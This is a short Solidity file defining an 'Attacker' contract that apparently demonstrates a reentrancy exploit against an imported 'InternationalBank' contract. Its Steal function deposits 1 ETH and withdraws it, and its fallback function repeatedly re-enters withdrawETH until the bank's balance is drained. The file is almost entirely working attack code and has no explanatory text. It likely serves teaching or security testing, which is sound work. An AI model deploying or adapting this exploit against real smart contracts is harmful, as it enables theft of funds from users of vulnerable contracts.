// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {InternationalBank} from "./InternationalBank.sol";

contract Attacker {
    uint256 public constant DEPOSIT_AMOUNT = 1 ether;
    InternationalBank public internationalBank;

    constructor(address p_internationalBankAddress) {
        internationalBank = InternationalBank(p_internationalBankAddress);
    }

    function Steal() public payable {
        require(msg.value >= DEPOSIT_AMOUNT, "Attacker deposit amount should be higher than 1 ETH.");
        internationalBank.depositETH{value: DEPOSIT_AMOUNT}();
        internationalBank.withdrawETH();
    }

    fallback() external payable {
        if (address(internationalBank).balance >= DEPOSIT_AMOUNT) {
            internationalBank.withdrawETH();
        }
    }

    function getAttackerContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
